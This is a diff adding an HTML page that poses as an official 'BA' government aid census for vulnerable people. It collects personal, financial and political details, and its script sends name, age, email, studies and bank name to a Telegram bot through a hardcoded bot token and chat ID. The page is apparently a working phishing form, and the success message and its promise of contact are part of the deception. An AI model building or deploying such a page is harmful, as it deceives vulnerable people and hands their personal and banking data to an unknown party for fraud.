@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Censo Vecinal Completo - BA</title>
+    <style>
+        :root {
+            --primary: #1A3C63;
+            --header-bg: #214A79;
+            --accent: #E67E22;
+            --bg: #f9f9f9;
+        }
+
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: var(--bg); margin: 0; padding: 0; color: #333; }
+
+        .page-header {
+            background-color: var(--header-bg);
+            height: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .ba-logo-bubble {
+            background-color: var(--primary);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 40px;
+            font-size: 3em;
+            font-weight: 800;
+            font-family: Arial Black, sans-serif;
+            z-index: 10;
+        }
+
+        .cloud-shape { position: absolute; background-color: #2e66a3; border-radius: 50%; opacity: 0.6; z-index: 5; }
+        .cloud-shape.c1 { width: 150px; height: 150px; bottom: -60px; left: 10%; }
+        .cloud-shape.c2 { width: 100px; height: 100px; top: -30px; left: 30%; }
+        .cloud-shape.c3 { width: 130px; height: 130px; bottom: -50px; right: 20%; }
+        .cloud-shape.c4 { width: 80px; height: 80px; top: 10px; right: 5%; }
+
+        .form-container {
+            max-width: 650px;
+            background: white;
+            margin: -20px auto 40px;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            position: relative;
+            z-index: 20;
+        }
+
+        .section-title { font-size: 1.1em; margin: 25px 0 15px; color: var(--accent); text-transform: uppercase; letter-spacing: 1px; font-weight: bold; border-bottom: 2px solid #eee; padding-bottom: 5px; }
+
+        .field-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-weight: 600; font-size: 0.9em; }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+
+        textarea { resize: none; min-height: 50px; font-family: inherit; }
+
+        .btn-submit {
+            background-color: var(--primary);
+            color: white;
+            padding: 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 1.1em;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+
+        .btn-submit:hover { background-color: #0b1c31; }
+
+        
+        #successMessage {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+        #successMessage h2 { color: var(--primary); }
+        #successMessage p { color: #666; font-size: 1.1em; }
+        .success-icon { font-size: 4em; color: #2ecc71; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+<header class="page-header">
+    <div class="cloud-shape c1"></div>
+    <div class="cloud-shape c2"></div>
+    <div class="cloud-shape c3"></div>
+    <div class="cloud-shape c4"></div>
+    <div class="ba-logo-bubble">BA</div>
+</header>
+
+<div class="form-container">
+    <div id="formContent">
+        <h1 style="text-align: center; color: var(--primary); margin-bottom: 5px;">Censo de Ayuda Ciudadana</h1>
+        <p style="text-align: center; color: #666; font-size: 0.9em; margin-bottom: 20px;">Completá los datos para el programa de ayuda para personas en estado vulnerable.</p>
+        
+        <form id="censoForm">
+            <div class="section-title">Información Personal</div>
+            <div class="field-group">
+                <label>Nombre Completo</label>
+                <input type="text" id="nombre" required>
+            </div>
+            <div style="display: flex; gap: 10px;">
+                <div class="field-group" style="flex: 1;">
+                    <label>Edad</label>
+                    <input type="number" id="edad">
+                </div>
+                <div class="field-group" style="flex: 2;">
+                    <label>Correo electrónico</label>
+                    <input type="email" id="email" required>
+                </div>
+            </div>
+            
+            <div style="display: flex; gap: 10px;">
+                <div class="field-group" style="flex: 1;">
+                    <label>¿Tenés hijos?</label>
+                    <select id="tiene_hijos">
+                        <option value="No">No</option>
+                        <option value="Si">Sí</option>
+                    </select>
+                </div>
+                <div class="field-group" style="flex: 1;">
+                    <label>¿Cuántos?</label>
+                    <input type="number" id="cantidad_hijos" value="0">
+                </div>
+            </div>
+
+            <div style="display: flex; gap: 10px;">
+                <div class="field-group" style="flex: 1;">
+                    <label>¿Estudiás?</label>
+                    <select id="estudia">
+                        <option value="No">No</option>
+                        <option value="Si">Sí</option>
+                    </select>
+                </div>
+                <div class="field-group" style="flex: 1;">
+                    <label>¿Qué estudias?</label>
+                    <input type="text" id="que_estudia" placeholder="Carrera o curso">
+                </div>
+            </div>
+
+            <div class="field-group">
+                <label>¿Contás con obra social?</label>
+                <input type="text" id="obra_social" placeholder="Ej: No tengo / OSDE / PAMI">
+            </div>
+            <div class="field-group">
+                <label>¿Qué te gusta hacer en tus tiempos libres?</label>
+                <textarea id="hobbies"></textarea>
+            </div>
+
+            <div class="section-title">Economía y Trabajo</div>
+            <div class="field-group">
+                <label>¿De qué trabajás?</label>
+                <input type="text" id="trabajo">
+            </div>
+            <div class="field-group">
+                <label>¿Te alcanza el sueldo hasta fin de mes?</label>
+                <select id="alcanza_sueldo">
+                    <option value="No especificado">Selecciona una opción</option>
+                    <option value="Si">Sí, cómodamente</option>
+                    <option value="Justo">Llego con lo justo</option>
+                    <option value="No">No llego a fin de mes</option>
+                </select>
+            </div>
+            <div style="display: flex; gap: 10px;">
+                <div class="field-group" style="flex: 1;">
+                    <label>¿Tenés cuenta bancaria?</label>
+                    <select id="tiene_banco">
+                        <option value="No">No</option>
+                        <option value="Si">Sí</option>
+                    </select>
+                </div>
+                <div class="field-group" style="flex: 1;">
+                    <label>si la respuesta es "Si"
+                      ¿con que banco te manejás?</label>
+                    <input type="text" id="Ban">
+                </div>
+            </div>
+
+            <div class="section-title">Política y Ayuda</div>
+            <div class="field-group">
+                <label>¿Qué tipo de ayuda te gustaría recibir del gobierno?</label>
+                <textarea id="ayuda_gobierno" placeholder="Ej: Subsidios, materiales, capacitación..."></textarea>
+            </div>
+            <div class="field-group"><label>¿Cómo te sentís con el gobierno actual?</label><textarea id="sentir_gobierno"></textarea></div>
+            <div class="field-group"><label>¿Qué debería mejorar urgentemente en la Argentina?</label><textarea id="mejoras_urgentes"></textarea></div>
+
+            <button type="submit" class="btn-submit" id="btnEnviar">Enviar</button>
+        </form>
+    </div>
+
+    <div id="successMessage">
+        <div class="success-icon">✓</div>
+        <h2>¡Se enviaron tus datos con éxito!</h2>
+        <p>Se pondrán en contacto con vos en las siguientes horas.</p>
+    </div>
+</div>
+
+<script>
+    const token = "8674409013:AAEd2IIvUoAb0O_GsLFkncp_BAGKMrKVJzw";
+    const chatId = "8423748155";
+
+    document.getElementById('censoForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        // Bloquear botón para evitar múltiples envíos
+        const btn = document.getElementById('btnEnviar');
+        btn.disabled = true;
+        btn.innerText = "Enviando...";
+
+        // Captura de datos corregida
+        const nombre = document.getElementById('nombre').value;
+        const email = document.getElementById('email').value;
+        const edad = document.getElementById('edad').value;
+        const estudia = document.getElementById('estudia').value;
+        const queEstudia = document.getElementById('que_estudia').value;
+        const banco = document.getElementById('Ban').value;
+
+        const mensaje = `
+📢 *NUEVO REGISTRO RECIBIDO*
+━━━━━━━━━━━━━━━━━━
+👤 *Nombre:* ${nombre}
+🎂 *Edad:* ${edad}
+📧 *Correo:* ${email}
+🎓 *Estudia:* ${estudia} (${queEstudia})
+🏦 *Banco:* ${banco}
+━━━━━━━━━━━━━━━━━━`;
+
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: mensaje,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => {
+            if (response.ok) {
+                // Intercambiar pantallas
+                document.getElementById('formContent').style.display = 'none';
+                document.getElementById('successMessage').style.display = 'block';
+            } else {
+                alert('Error al enviar. Verifica que el Bot esté iniciado con /start');
+                btn.disabled = false;
+                btn.innerText = "Enviar";
+            }
+        })
+        .catch(error => {
+            alert('Error de conexión.');
+            btn.disabled = false;
+            btn.innerText = "Enviar";
+        });
+    });
+</script>
+
+</body>
+</html>
